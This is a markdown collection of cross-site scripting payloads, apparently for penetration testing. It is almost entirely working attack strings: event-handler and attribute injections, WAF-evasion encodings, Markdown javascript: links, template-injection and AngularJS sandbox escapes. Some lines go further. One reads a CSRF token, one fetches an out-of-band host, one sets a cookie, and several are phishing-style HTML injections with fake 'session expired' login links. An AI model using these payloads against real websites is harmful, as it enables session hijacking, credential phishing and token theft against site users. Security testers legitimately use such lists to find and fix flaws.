# XSS Payload Collection

This is a curated list of XSS payloads used in penetration testing engagements. Payloads range from simple detection strings to advanced WAF bypasses, DOM clobbering, HTML injection, jQuery tricks, AngularJS sandbox escapes, and real-world PoCs.

---

## 🚩 Basic XSS Payloads

These payloads are useful for detection or for quickly verifying that XSS exists.

```html
<script>alert(document.domain)</script>
<svg src=x onerror=confirm(document.domain)>
<svg/onerror=alert('XSS')>
<img src=x onerror=confirm(document.domain)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=prompt(document.domain)>
<iframe src="javascript:alert(document.domain);"></iframe>
<button onclick="alert(document.domain)">Click me</button>
<a href="javascript:alert(document.domain)">Click me</a>
<marquee onstart=alert(document.domain)>
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<body onload=alert(document.domain)>
<body onresize=console.dir(11)></body>
```

---

## 📝 Event Handler Payloads

```html
<xss onmousemove="alert(document.domain)">test</xss>
<xss onmouseleave="prompt(document.domain)">test</xss>
<a/href="#"/oncut=prompt`1`>cutme</a>
<form action="javascript:alert(1)" onsubmit="javascript:prompt(2)">
  <button type="submit" onclick="prompt`2`" onclick="prompt`3`" onclick="prompt`4`">Submit</button>
</form>
<form action="J\aV\a\s\cr\i\pt\::prompt`1`;http://" target="">
  <button type="submit" onclick="prompt`2`" onclick="prompt`3`" onclick="prompt`4`">Submit</button>
</form>
```

---

## 💡 Attribute Injection

```html
foo'" onmouseenter="alert(document.domain)" bar
foo'" onmousemove="alert(document.domain)" bar
foo'" onmouseenter="alert(document.domain)" bar.csv
foo'\" onmouseenter=\"alert(document.domain)\" bar.html
foo%27%22onmouseenter%3d%22%28alertdocument.domain%29%22%20bar%2ecom
```

---

## 🔀 Obscure / Modified Variants

```html
'"/><svg src=x onerror=confirm(document.domain)>
'"/><img src=x onerror=prompt(document.domain)>
'"/><img src=x onerror=prompt`document.domain`>
'&quot;&gt;&lt;img src=x onerror=prompt`document.domain`&gt;
&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;scri\pt&gt;confirm(1)&lt;/scri\pt&gt;
💋img src=x onerror=alert(document.domain)//💛
```

---

## 🧠 Comment Tricks

```html
<!--'"/><img src=x onerror=prompt(document.domain)>
<!--'"/><svg src=x onerror=confirm(document.domain)>
<!--'\"/><img src=x onerror=prompt(document.domain)>
<!-- <textarea><img title="</textarea><img src=x onerror=alert()>"></textarea>
<!--<textarea><img title=\"</textarea><img src=x onerror=alert()>\"></textarea>
```

---

## 🧪 SVG / CSS / Media Payloads

```html
<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="confirm(document.domain)"></animate></svg>
<svgonload=alert(1)>
<div style="background-image:url(javascript:confirm(document.domain))"></div>
<h1 style="background-color:red;background-image:url('javascript:confirm`1`')">B2<h1>
```

---

## 🌐 JavaScript URL Bypasses

```html
<a href="JaVaScRiPt%3Aalert(1)">test</a>
<a href="vbscript:msgbox(1)">test</a>
javascript:alert(document.domain);//https://
jAvAsCrIpT:prompt('xss');//https://
javascript:parent.window.alert(document.domain);x=globalThis.parent.window.document.getElementsByName("__RequestVerificationToken")[0].value;
```

---

## 💥 Advanced Polyglots & Function Abuse

```js
#!@*%alert`1`
+!+[]
Function("ale"+"rt(1)")();
eval`2+2`;
[{{alert;pg`XSS`}}]
new Function`alt\`6\``;
```

---

## 🧵 Template Injection

```js
{{7*7}}                       // Jinja2
${constructor.constructor('alert(1)')()}
{{constructor.constructor('alert(1)')()}}
{{constructor['constructor'](`alert(1)`)()}}
{{constructor.constructor('alert(1)')()}}{{7*7}}
#{7*7}                        // Thymeleaf
```

---

## 🖼 Dummy Image PoCs

```html
<img src="https://raw.githubusercontent.com/thiem-dev/xssCat/main/tpen-safe-cat.jpg" onerror=prompt`document.domain`>
<img src="http://mj96aqjvk4k9incbw2o252mia9g04tsi.oastify.com" onerror=alert`document.domain`>
```

---

## 🔐 HTML Injection - Phishing Style

```html
<a href="http://bing.com">Your session has expired. Click here to login</a>
<a href="https://google.com/">Click here to reset your password</a>
<a href="https://google-web-pen-testing.vercel.app/">Session expired. Click to login</a>
&lt;a href="https://google.com/"&gt;Click here to reset password&lt;/a&gt;
%3Ca%20href%3D%22https%3A%2F%2Fgoogle.com%2F%22%3EClick%20here%20to%20reset%20password%3C%2Fa%3E
```

---

## 🧨 HTML Injection - Green Box PoC

```html
<a href="http:/bing.com" style="height:100vh;width:100vw;position:fixed;top:-25px;left:-525px;">a</a>
<a href="javascript:confirm(document.domain)" style="height:100vh;width:100vw;position:fixed;top:-25px;left:-525px;">a</a>
<a href="https://bing.com" style="background-color:green">abc</a>
<h1 style="background-color:red;background-image:url('javascript:confirm`1`')">B2</h1>
<iframe src="[oastify]">
```

---

## 🎯 DOM Clobbering

```html
<form id=x><output id=y>Clobbered</output>
<script>alert(x.y.value);</script>
```

---

## 🐞 "Big One" Multi-Sink PoC

```html
<a href=javascript:confirm(1) onclick=prompt(2)>Click</a>
<img src=x onerror=console.log(3)>
<input type=text onfocus=fetch('[oast]')>
<button onmouseover=document.write(4)>Hover</button>
<div onmousemove=localStorage.setItem('x',5)>storeX</div>
<form onsubmit=sessionStorage.setItem('y',6)><input type=submit></form>
<video oncanplay=console.error(7)><source src=x></video>
<svg onload=document.cookie='test=xss8'></svg>
<marquee onstart=document.location='javascript:alert(1)'>Test</marquee>
<details ontoggle=navigator.sendBeacon('/log',9)><summary>Click</summary></details>
<iframe src=javascript:open('https://bing.com?xss12')></iframe>
<svg><animate attributeName="x" begin="0s" dur="1s" repeatCount="indefinite" onbegin=console.warn(10)></animate></svg>
```

---

## 🔄 WAF Evasion & Encoding Tricks

```html
<scr<script>ipt>alert(XSS)</scr<script>ipt>
<sCrIpT>alert(XSS)</sCriPt>
<<script>alert(XSS)</script>
<script>alert(XSS)
<script>alert`XSS`</script>
java%0ascript:alert(1)
<iframe src=http://bing.com <
<STYLE>.classname{background-image:url("javascript:alert(XSS)")}</STYLE>
<img/src=1/onerror=alert(0)>
<a href=javascript:alert(1)>xss</a>
data:text/html;base64,YWxlcnRgMWA=
data:text/html;base64,amF2YXNjcmlwdDovKi0t...
<a href="java%0ascript:confirm(document.domain)">link</a>
```

---

## 🪵 Markdown XSS

```md
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

---

## 🅰️ AngularJS Payloads

From [PortSwigger AngularJS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

```js
constructor.constructor('alert(1)')()
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}{{7*7}}
${constructor.constructor('alert(1)')()}
{{constructor['constructor'](`alert(1)`)()}}
```

**Sandbox Breakout Example:**

```url
...?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

---